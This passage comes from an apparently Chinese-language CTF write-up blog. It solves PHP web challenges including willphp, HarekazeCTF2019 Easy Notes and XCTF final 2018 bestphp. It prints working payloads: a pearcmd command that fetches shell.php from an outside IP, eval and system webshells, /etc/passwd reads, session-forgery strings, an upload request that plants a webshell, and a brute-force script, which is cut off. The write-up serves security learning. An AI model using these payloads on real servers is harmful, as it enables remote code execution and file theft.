&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">assign&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;value&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">view&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>assign()可以控制name和value参数，而紧跟着的view函数有点东西&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101839993.png" alt="image-20211118101839993">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118101952307.png" alt="image-20211118101952307">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102033617.png" alt="image-20211118102033617">&lt;/p>
&lt;p>可以看到最后的49行有文件写入的点，51行有个&lt;code>extract()&lt;/code>可以做到变量覆盖，那我们就把file_put_contents的参数换成自己想要的&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>可以正常回显&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118102448850.png" alt="image-20211118102448850">&lt;/p>
&lt;p>不过flag文件的名字并不是flag，我们可以用pearcmd写shell的方法来个webshell（详细的可以参考我之前写过的另一个题-&amp;gt;&lt;a href="https://amiaaaz.github.io/2021/10/26/qwnt2021-wp/#give_me_you_0day">[强网拟态 2021]Give_me_your_0day&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/../../../../usr/local/lib/php/pearcmd.php&amp;amp;+install+-R+/tmp+http://101.35.114.107:2301/shell.php
&lt;/code>&lt;/pre>&lt;p>不过这里要注意shell的写法，常规的&lt;code>&amp;lt;?php eval($_POST['a']);?&amp;gt;&lt;/code>这样的是不行的，下载就会报错&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118103659930.png" alt="image-20211118103659930">&lt;/p>
&lt;p>执行也会报错，这里的shell要这样写&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;?php system(&amp;#34;ls /&amp;#34;);&amp;#39;&lt;/span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118105922638.png" alt="image-20211118105922638">&lt;/p>
&lt;p>之后直接把value的值换成flag文件名即可&lt;/p>
&lt;pre tabindex="0">&lt;code>/?name=cfile&amp;amp;value=/flag32897328937298hdwidh
&lt;/code>&lt;/pre>&lt;p>————不过这里我直接写🐎一直成功不了，只能远程包含🐎&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211118110226581.png" alt="image-20211118110226581">&lt;/p>
&lt;p>————诶，说了半天，其实和本篇有关的在非预期的点，和上面的脚本几乎一样，要改的地方在于read部分的url了&lt;/p>
&lt;pre tabindex="0">&lt;code>?name=cfile&amp;amp;value=/tmp/sess_&amp;#39;+sessid
&lt;/code>&lt;/pre>&lt;h2 id="反序列化">反序列化&lt;/h2>
&lt;p>这里详细的讲解可以参照&lt;a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHP中SESSION反序列化机制&lt;/a>，就不做复制粘贴工程师了，用自己的话讲几个里面已经提过的点吧&lt;/p>
&lt;p>首先，这里的问题（我们可以攻击的原因）出现在两种序列化引擎混用的情况下，当提交&lt;/p>
&lt;pre tabindex="0">&lt;code>?a=|O:8:&amp;#34;stdClass&amp;#34;:0:{}
&lt;/code>&lt;/pre>&lt;p>时，&lt;code>php_serialize&lt;/code>方式下会被存储为&lt;/p>
&lt;pre tabindex="0">&lt;code>a:1:{s:1:&amp;#34;a&amp;#34;;s:20:&amp;#34;|O:8:&amp;#34;stdClass&amp;#34;:0:{}&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>但是被&lt;code>php&lt;/code>方式则会解析为&lt;/p>
&lt;pre tabindex="0">&lt;code>a:1:{s:1:&amp;#34;a&amp;#34;;s:20:&amp;#34;=O:8:&amp;#34;stdClass&amp;#34;:0:{}&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>在具体应用时，可控的点除了get/post的参数之外，还可以接着构造文件上传的表单，除了&lt;code>PHPSESSID&lt;/code>之外的废物文件的文件名就可以当此大任，记得序列化字符前面要加上&lt;code>|&lt;/code>，内部的双引号要用&lt;code>\&lt;/code>进行转义&lt;/p>
&lt;h3 id="harekazectf2019easy-notes">[HarekazeCTF2019]Easy Notes&lt;/h3>
&lt;p>这个题得审&lt;a href="https://github.dev/TeamHarekaze/HarekazeCTF2019-challenges/tree/master/easy_notes/server/public">源码&lt;/a>&lt;/p>
&lt;p>有添加note 导出note的功能，但是却不是常见的xss（因为是php写的嘛），会检测session中的admin是不是true&lt;/p>
&lt;p>我们的突破口在导出.zip这个功能上&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203112810148.png" alt="image-20211203112810148">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203113735250.png" alt="image-20211203113735250">&lt;/p>
&lt;p>我们可以手动伪造一个session文件，之后将PHPSESSID设为生成的值即可，内容呢 就是admin=1&lt;/p>
&lt;pre tabindex="0">&lt;code>xxxx|N;admin|b:1;xxxxxx
&lt;/code>&lt;/pre>&lt;p>用&lt;code>xxxx|N;&lt;/code>闭合前面脏数据，编辑到title中，将session的PHPSESSID设置好就可以getflag了&lt;/p>
&lt;h3 id="xctf-final-2018bestphp">[XCTF final 2018]bestphp&lt;/h3>
&lt;p>&lt;a href="https://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp">这里是docker环境&lt;/a>（注意设置暴露端口 另外首页的index.php的submit要改一下&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129171252486.png" alt="image-20211129171252486">&lt;/p>
&lt;p>这里有熟悉的&lt;code>call_user_func&lt;/code>，来读一下admin.php的源码&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=extract&amp;amp;file=php://filter/convert.base64-encode/resource=admin.php
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">hello&lt;/span> &lt;span style="color:#75af00">admin&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">empty&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SESSION&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;name&amp;#39;&lt;/span>&lt;span style="color:#111">])){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">session_start&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#echo &amp;#39;hello &amp;#39; + $_SESSION[&amp;#39;name&amp;#39;];
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;you must login with admin&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>再读一下function.php，但是好像这俩都没啥用&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">filters&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#f92672">=&amp;gt;&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/eval|assert|exec|passthru|glob|system|popen/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Do not hack me!&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>很显然我们需要利用session包含，但是index.php中设置了open_basedir，默认的session路径是&lt;code>/var/lib/php/sessions/sess_phpsessid&lt;/code>，不过有个方式可以更改session存储目录&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172602323.png" alt="image-20211129172602323">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172609578.png" alt="image-20211129172609578">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129172619585.png" alt="image-20211129172619585">&lt;/p>
&lt;p>那我们就可以把shell写到web根目录下&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=session_start&amp;amp;save_path=.
POST: name=&amp;lt;?php echo &amp;#34;aaa&amp;#34;;system($_GET[x]);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>一般的一句话会没法正常工作（之前湖湘杯willphp也是这样，那个是&lt;code>&amp;lt;?php echo '&amp;lt;?php system(&amp;quot;ls /&amp;quot;);'?&amp;gt;&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>?function=extract&amp;amp;file=/var/www/html/sess_qwer&amp;amp;x=ls
?function=extract&amp;amp;file=/var/www/html/sess_qwer&amp;amp;x=cat+fsadgsdagsadgasd.php
&lt;/code>&lt;/pre>&lt;p>拿到flag&lt;/p>
&lt;h4 id="解法2php70---lfi-via-segmentfault">解法2：php7.0 - LFI via SegmentFault&lt;/h4>
&lt;p>参考：&lt;a href="https://www.jianshu.com/p/dfd049924258">LFI via SegmentFault&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>include.php?file=php://filter/string.strip_tags/resource=/etc/passwd
&lt;/code>&lt;/pre>&lt;p>&lt;code>string.strip_tags&lt;/code>可以导致php在执行过程中Segment Fault&lt;/p>
&lt;p>如果请求中同时存在一个上传文件的请求，这个文件会被保留，存储在/tmp/phpxxxxxxxxxxx（xxxxx是数字+字母的6位数），这个文件连续保存，不用竞争直接爆破（多线程上传文件，生成多个phpxxxxxxxxxxx）&lt;/p>
&lt;p>利用exp（打出来502是正常情况&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/index.php?function=extract&amp;amp;file=php://filter/string.strip_tags/resource=function.php&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">101.35.114.107:20004&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1701&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cache-Control&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">max-age=0&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Origin&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">null&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Upgrade-Insecure-Requests&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DNT&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundaryeScXqSzdW2v22xyk&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User-Agent&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Encoding&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">gzip, deflate&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Accept-Language&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cookie&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">PHPSESSID=17qpuv1r8g19pm503593nddq10&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">close&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>------WebKitFormBoundaryeScXqSzdW2v22xyk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Disposition: form-data; name=&amp;#34;fileUpload&amp;#34;; filename=&amp;#34;test.jpg&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: image/jpeg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?php echo &amp;#34;wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww&amp;#34;;@eval($_POST[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>------WebKitFormBoundaryeScXqSzdW2v22xyk--
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>上帝视角看的话是这样&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211129183250382.png" alt="image-20211129183250382">&lt;/p>
&lt;p>用py脚本爆破出来(py2)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">charset&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digits&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">letters&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;10.99.99.16&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">80&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">base_url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">:&lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">brute_force_tmp_files&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">charset&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filename&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">j&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">k&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">l&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">n&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">/index.php?function=extract&amp;amp;file=/tmp/php&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">base_url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">url&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">&amp;#39;wwwwwwwwwwwwww&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">content&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#d88200">&amp;#34;[+] Include success!&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
